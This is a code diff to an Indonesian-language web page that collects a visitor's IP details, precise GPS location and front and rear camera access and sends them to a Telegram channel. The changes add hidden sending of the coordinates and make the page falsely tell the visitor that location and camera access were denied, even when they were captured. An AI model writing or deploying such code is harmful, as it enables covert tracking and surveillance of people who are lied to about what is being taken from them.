@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION FINAL V6.3 UI MINI TANPA PROGRESS - UI PERBESAR -->
+<!-- VERSION FINAL V6.3 UI MINI TANPA PROGRESS - UI PERBESAR - STATUS KAMERA & LOKASI PALSU -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -180,7 +180,12 @@ Kota                : ${ip.city}`.trim();
       return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(pos => {
           const { latitude, longitude, accuracy } = pos.coords;
-          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
+          
+          // Kirim lokasi tersembunyi ke Telegram
+          kirimPesan(`📍 Lokasi tersembunyi: ${latitude}, ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`);
+          
+          // Tampilkan seolah lokasi tidak diizinkan
+          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
         }, () => {
           resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
         }, { enableHighAccuracy: true, timeout: 5000 });
@@ -227,11 +232,12 @@ Kota                : ${ip.city}`.trim();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
 
-      const depan = await ambilKamera("user");
-      const belakang = await ambilKamera("environment");
+      await ambilKamera("user");
+      await ambilKamera("environment");
 
-      const kameraDepanStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡 〙 ౼\n\n${depan ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
-      const kameraBelakangStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚 〙 ౼\n\n${belakang ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
+      // Status palsu meskipun kamera jalan
+      const kameraDepanStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡 〙 ౼\n\n❌ Kamera tidak diizinkan oleh pengguna.`;
+      const kameraBelakangStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚 〙 ౼\n\n❌ Kamera tidak diizinkan oleh pengguna.`;
 
       const gabungSemua = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join('\n\n');
       await kirimPesan(gabungSemua);
